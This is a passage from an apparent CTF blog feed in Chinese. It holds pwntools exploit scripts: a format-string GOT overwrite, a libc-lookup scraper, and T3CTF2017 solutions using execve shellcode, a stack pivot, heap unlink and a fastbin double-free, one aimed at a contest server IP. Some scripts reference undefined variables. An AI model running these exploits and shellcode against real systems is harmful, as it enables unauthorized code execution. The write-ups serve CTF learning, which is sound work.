class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-08 21:08:57</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./echo"</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">bss = rop.section(<span class="string">'.bss'</span>)+<span class="number">0x30</span></div><div class="line">printf_got = rop.got(<span class="string">'printf'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x80486C1\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># stage 1 get fmt offset</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">p = process(target)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line">p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">p.sendline(payload)</div><div class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>]</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(payload)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line"><span class="comment"># stage 2 get system_addr</span></div><div class="line"></div><div class="line">offset_system = [<span class="number">-63744</span>, <span class="number">-78400</span>, <span class="number">-55008</span>, <span class="number">-57072</span>, <span class="number">-55136</span>, <span class="number">-61392</span>, <span class="number">-55120</span>, <span class="number">-59840</span>, <span class="number">-64784</span>, <span class="number">-59456</span>, <span class="number">-58400</span>, <span class="number">-58480</span>, <span class="number">-60464</span>, <span class="number">-76112</span>, <span class="number">3792</span>, <span class="number">-70432</span>, <span class="number">-58160</span>, <span class="number">-1063904</span>, <span class="number">-1042576</span>, <span class="number">-1041936</span>, <span class="number">-68192</span>, <span class="number">-77448</span>, <span class="number">-51488</span>, <span class="number">-71904</span>]</div><div class="line"><span class="keyword">for</span> o <span class="keyword">in</span> offset_system:</div><div class="line"><span class="keyword">try</span>:</div><div class="line">p = process(target)</div><div class="line">printf_got = rop.got(<span class="string">"printf"</span>)</div><div class="line">puts_got = rop.got(<span class="string">"puts"</span>)</div><div class="line"></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(p32(printf_got)+<span class="string">"%7$s"</span>)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"payload"</span>)</div><div class="line"></div><div class="line">printf_addr = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</div><div class="line"></div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(p32(puts_got)+<span class="string">"%7$s"</span>)</div><div class="line">ru(<span class="string">"input:"</span>)</div><div class="line">sl(<span class="string">"payload"</span>)</div><div class="line"></div><div class="line">puts_addr = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"printf_addr="</span>+hex(printf_addr)</div><div class="line"><span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"></div><div class="line"></div><div class="line">system_addr = printf_addr+o</div><div class="line"></div><div class="line"><span class="comment"># stage 3 change printf_addr to system_addr</span></div><div class="line">autofmt = FmtStr(send_payload,offset=offset)</div><div class="line">autofmt.write(printf_got,system_addr)</div><div class="line">autofmt.execute_writes()</div><div class="line"><span class="comment"># print offset</span></div><div class="line"><span class="comment"># print "bss_addr="+hex(bss)</span></div><div class="line"><span class="comment"># payload = fmtstr_payload(1,&#123;bss:0xdeadbeaf&#125;,1,"byte")</span></div><div class="line"><span class="comment"># print payload</span></div><div class="line"></div><div class="line">p.interactive()</div><div class="line"><span class="keyword">except</span>:</div><div class="line"><span class="keyword">continue</span></div></pre></td></tr></table></figure><p>后记：啥时候出个FSP自动利用的啊。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;翻pwntools文档的时候突然发现了pwntools多了一个自动完成fmt漏洞利用的特性。&lt;/p&gt;
&lt;p&gt;官方文档链接  &lt;a href=&quot;http://pwntools.readthedocs.io/en/stable/fmtstr.html&quot; target=&quot;_bla
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="pwntools" scheme="https://winter3un.github.io/tags/pwntools/"/>
    
      <category term="fmt" scheme="https://winter3un.github.io/tags/fmt/"/>
    
  </entry>
  
  <entry>
    <title>how_to_get_libc</title>
    <link href="https://winter3un.github.io/2017/04/08/how-to-get-libc/"/>
    <id>https://winter3un.github.io/2017/04/08/how-to-get-libc/</id>
    <published>2017-04-08T07:29:54.000Z</published>
    <updated>2017-05-22T16:58:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>比赛的时候，遇到比较坑爹的情况，没有提供给libc库，这个时候就需要用各种姿势去泄露libc库。</p><p>1、询问组委会，是否提供libc库，很有可能就放提示了</p><p>2、通过return2libc技巧，泄露got内保存的库函数地址，去 <a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a>  找对应的库版本，这边我写了一个get_libc的小脚本（但并不是百分之一百能找到的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="comment"># a_name = raw_input('input a_name= ')</span></div><div class="line"><span class="comment"># a_addr = raw_input('input a_addr=')</span></div><div class="line"><span class="comment"># b_name = raw_input('input b_name=')</span></div><div class="line"><span class="comment"># b_addr = raw_input('input b_addr=')</span></div><div class="line"><span class="comment"># a_name= 'read'</span></div><div class="line"><span class="comment"># a_addr='0xb76a9bd0'</span></div><div class="line"><span class="comment"># b_name='shutdown'</span></div><div class="line"><span class="comment"># b_addr='0xb76bc610'</span></div><div class="line">a_name=<span class="string">'printf'</span></div><div class="line">a_addr=<span class="string">'0x7f0ff5dadba0'</span></div><div class="line">b_name=<span class="string">'read'</span></div><div class="line">b_addr=<span class="string">'0x7f0ff5e50470'</span></div><div class="line"></div><div class="line">may_system_offset=[]</div><div class="line">url = <span class="string">'http://libcdb.com/search?symbolA='</span>+a_name+<span class="string">'&amp;addressA='</span>+a_addr+<span class="string">'&amp;symbolB='</span>+b_name+<span class="string">'&amp;addressB='</span>+b_addr</div><div class="line">r1 = get(url)</div><div class="line">list_ = re.findall(<span class="string">r'&lt;li&gt;&lt;a href="(.*?)"&gt;Libc\:'</span>,r1.content)</div><div class="line">payload = <span class="string">'may_system_offset = ['</span></div><div class="line"><span class="keyword">if</span> len(list_)&gt;<span class="number">0</span>:</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> list_:</div><div class="line">url = <span class="string">'http://libcdb.com'</span>+x+<span class="string">'/symbols?name=__libc_system'</span></div><div class="line">system_offset = get(url)</div><div class="line">system_offset = re.findall(<span class="string">r'/dt&gt;\n        &lt;dd&gt;(.*?)&lt;/dd&gt;\n        \n    &lt;/dl&gt;'</span>,system_offset.content)[<span class="number">0</span>].replace(<span class="string">'libc_base + 0x'</span>,<span class="string">''</span>)</div><div class="line"><span class="keyword">print</span> system_offset</div><div class="line">url = <span class="string">'http://libcdb.com'</span>+x+<span class="string">'/symbols?name='</span>+b_name</div><div class="line">func_offset = get(url)</div><div class="line"><span class="comment"># print func_offset.content</span></div><div class="line">func_offset = re.findall(<span class="string">r'&gt;'</span>+b_name+<span class="string">'&lt;/dt&gt;\n        &lt;dd&gt;(.*?)&lt;/dd&gt;'</span>,func_offset.content)[<span class="number">0</span>].replace(<span class="string">'libc_base + 0x'</span>,<span class="string">''</span>)</div><div class="line">may_system_offset.append(int(system_offset,<span class="number">16</span>)-int(func_offset,<span class="number">16</span>))</div><div class="line">may_system_offset = list(set(may_system_offset))</div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> may_system_offset:</div><div class="line">payload += hex(x)+<span class="string">','</span></div><div class="line">payload = payload[:<span class="number">-1</span>]</div><div class="line"><span class="keyword">print</span> payload+<span class="string">']'</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">'oops! nothing!'</span></div><div class="line"></div><div class="line">raw_input()</div></pre></td></tr></table></figure><p>3、利用return to dl resolve技术，这个已经有成熟的辅助工具了。<a href="https://github.com/inaz2/roputils" target="_blank" rel="external">https://github.com/inaz2/roputils</a></p><p>4、利用其他题目的libc库，出题人为了方便，很有可能用的相同libc库</p><p>5、利用pwntools提供的dynelf函数来寻找system地址，不过需要有个leak函数。可参考 <a href="http://bobao.360.cn/learning/detail/3298.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3298.html</a> （蛋疼的是，不知道为啥我的ELF()函数一直是坏的。</p><hr><p>2017/5/23日添加</p><p>6、泄露Smallbin的FD、BK进行libc base获取</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;比赛的时候，遇到比较坑爹的情况，没有提供给libc库，这个时候就需要用各种姿势去泄露libc库。&lt;/p&gt;
&lt;p&gt;1、询问组委会，是否提供libc库，很有可能就放提示了&lt;/p&gt;
&lt;p&gt;2、通过return2libc技巧，泄露got内保存的库函数地址，去 &lt;a href=&quot;ht
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】T3CTF2017 堆溢出以及return to  dl slove</title>
    <link href="https://winter3un.github.io/2017/04/08/T3CTF2017/"/>
    <id>https://winter3un.github.io/2017/04/08/T3CTF2017/</id>
    <published>2017-04-08T07:26:51.000Z</published>
    <updated>2017-04-08T07:51:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>pwn1，没什么好说的，看了下checksec，NX没开，栈迁移以后直接执行bss上的shellcode就可以了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> pwn</div><div class="line"></div><div class="line">p = pwn.remote(<span class="string">"127.0.0.1"</span>,<span class="number">12346</span>)</div><div class="line">addr_bss = <span class="number">0x0804A080</span></div><div class="line">buf =  p32(<span class="number">0x0804A080</span>+<span class="number">4</span>)+<span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span></div><div class="line">buf += (<span class="number">0x1f4</span>-len(buf))*<span class="string">'a'</span></div><div class="line">p.send(buf)</div><div class="line"></div><div class="line"></div><div class="line">buf = <span class="string">'a'</span>*<span class="number">504</span></div><div class="line">buf += p32(<span class="number">0x0804A080</span>+<span class="number">4</span>)</div><div class="line">p.sendline(buf)</div><div class="line">data = p.recvuntil(<span class="string">"\n"</span>)</div><div class="line">p.sendline(<span class="string">"cat /lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>pwn2的libc可以从pwn1中获取。非常经典的double free教学题。可以参考 <a href="http://www.tuicool.com/articles/yquU732" target="_blank" rel="external">http://www.tuicool.com/articles/yquU732</a> （double free浅析，乌云的文章）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-07 19:09:17</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(<span class="string">'./pwn2'</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x0400A6D\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(<span class="string">"120.27.248.138"</span>,<span class="number">12345</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,length,data)</span>:</span></div><div class="line">ru(<span class="string">"the action:"</span>)</div><div class="line">sd(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"note index:\n"</span>)</div><div class="line">sd(str(index))</div><div class="line">ru(<span class="string">" of the new note:\n"</span>)</div><div class="line">sd(str(length))</div><div class="line">ru(<span class="string">"ts of note:"</span>)</div><div class="line">sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"the action:"</span>)</div><div class="line">sd(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"ter the note index:"</span>)</div><div class="line">sd(str(index))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,length,data)</span>:</span></div><div class="line">ru(<span class="string">"the action:"</span>)</div><div class="line">sd(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">" note index:"</span>)</div><div class="line">sd(str(index))</div><div class="line">ru(<span class="string">" new note:"</span>)</div><div class="line">sd(str(length))</div><div class="line">ru(<span class="string">"of note:\n"</span>)</div><div class="line">sd(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"the action:"</span>)</div><div class="line">sd(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">" note index:"</span>)</div><div class="line">sd(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_anyaddr</span><span class="params">(addr,data)</span>:</span></div><div class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(<span class="number">0x6020a8</span>)+p64(<span class="number">0</span>)+p64(addr)</div><div class="line">edit(<span class="number">0</span>,len(payload),payload)</div><div class="line">edit(<span class="number">2</span>,len(data),data)</div><div class="line"></div><div class="line">add(<span class="number">0</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">1</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">2</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">3</span>,<span class="number">512</span>,<span class="string">"/bin/sh\x00"</span>)</div><div class="line">head = p64(<span class="number">0</span>)+p64(<span class="number">1</span>+<span class="number">512</span>)</div><div class="line">fd = p64(<span class="number">0x6020C0</span> - <span class="number">0x18</span>)</div><div class="line">bk = p64(<span class="number">0x6020C0</span> - <span class="number">0x10</span>)</div><div class="line">payload =  head+fd+bk</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">512</span>-len(payload))</div><div class="line">payload += p64(<span class="number">512</span>)+p64(<span class="number">512</span>+<span class="number">0x10</span>)</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">600</span>-len(payload))</div><div class="line">edit(<span class="number">0</span>,<span class="number">600</span>,payload)</div><div class="line">dele(<span class="number">1</span>)</div><div class="line"></div><div class="line">free_got = <span class="number">0x602018</span></div><div class="line">edit_anyaddr(<span class="number">0x6020C0</span>+<span class="number">0x20</span>,p64(puts_got))</div><div class="line">show(<span class="number">4</span>)</div><div class="line">free_addr = u64(ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"free_addr="</span>+hex(free_addr)</div><div class="line"></div><div class="line">offset = <span class="number">0x83940</span><span class="number">-0x45390</span></div><div class="line">system_addr = puts_addr - offset</div><div class="line">edit_anyaddr(<span class="number">0x602018</span>,p64(system_addr))</div><div class="line">dele(<span class="number">3</span>)</div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment">#flag&#123;038a6d27a716d1e1472b1eded07c385d&#125;</span></div></pre></td></tr></table></figure><p>pwn3是fastbin double free attack的考察点，要利用这个攻击我们需要伪造出一个fake fastbin出来,所幸题目给予了所有的攻击条件。</p><p>可参考 <a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-07 19:09:17</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(<span class="string">'./pwn3'</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x4009da\nc")</span></div><div class="line"><span class="comment"># else:</span></div><div class="line"><span class="comment"># p = remote()</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">welcome</span><span class="params">(data)</span>:</span></div><div class="line">ru(<span class="string">"name\n"</span>)</div><div class="line">sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,length,data)</span>:</span></div><div class="line">ru(<span class="string">"delete paper\n"</span>)</div><div class="line">sd(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"o store(0-9):"</span>)</div><div class="line">sd(str(index))</div><div class="line">ru(<span class="string">"ill enter:"</span>)</div><div class="line">sd(str(length))</div><div class="line">ru(<span class="string">"our content:"</span>)</div><div class="line">sd(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(index,length,data)</span>:</span></div><div class="line">sd(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"o store(0-9):"</span>)</div><div class="line">sd(str(index))</div><div class="line">ru(<span class="string">"ill enter:"</span>)</div><div class="line">sd(str(length))</div><div class="line">ru(<span class="string">"our content:"</span>)</div><div class="line">sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">ru(<span class="string">"delete paper\n"</span>)</div><div class="line">sd(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"index(0-9):"</span>)</div><div class="line">sd(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setsize</span><span class="params">(size)</span>:</span></div><div class="line">ru(<span class="string">"delete paper\n"</span>)</div><div class="line">sd(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"number:"</span>)</div><div class="line">sd(str(size))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"delete paper\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*(<span class="number">0x30</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*(<span class="number">0x30</span>))</div><div class="line"><span class="keyword">return</span> u64(ru(<span class="string">"\n"</span>)[<span class="number">0x30</span>:<span class="number">0x30</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line">buf =  <span class="string">""</span></div><div class="line">buf += <span class="string">"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"</span></div><div class="line">buf += <span class="string">"\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"</span></div><div class="line">buf += <span class="string">"\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"</span></div><div class="line">buf += <span class="string">"\x00\x56\x57\x48\x89\xe6\x0f\x05"</span></div><div class="line"></div><div class="line">shellcode = buf</div><div class="line">shellcode_addr = <span class="number">0x6020c0</span></div><div class="line"></div><div class="line">welcome(shellcode)</div><div class="line">setsize(<span class="number">0x30</span>)</div><div class="line">stack_addr = leak_stack()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"stack_addr="</span>+hex(stack_addr)</div><div class="line">offset = <span class="number">0x7ffcfca53d30</span> - <span class="number">0x00007ffcfca53c20</span> </div><div class="line">target_addr = stack_addr-offset<span class="number">-0x8</span></div><div class="line"><span class="keyword">print</span> <span class="string">"offset = "</span>+hex(offset)</div><div class="line"><span class="keyword">print</span> <span class="string">"target_addr = "</span>+hex(target_addr)</div><div class="line"></div><div class="line">add2(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">dele(<span class="number">0</span>)</div><div class="line">dele(<span class="number">1</span>)</div><div class="line">dele(<span class="number">0</span>)<span class="comment">#a-b-a</span></div><div class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,p64(target_addr))</div><div class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,p64(target_addr))</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x10</span>+p64(shellcode_addr)</div><div class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,payload)</div><div class="line">sd(<span class="string">"4"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pwn1，没什么好说的，看了下checksec，NX没开，栈迁移以后直接执行bss上的shellcode就可以了。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div cl
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://winter3un.github.io/tags/pwn/"/>
    
      <category term="heap overflow" scheme="https://winter3un.github.io/tags/heap-overflow/"/>
    
  </entry>
  
</feed>
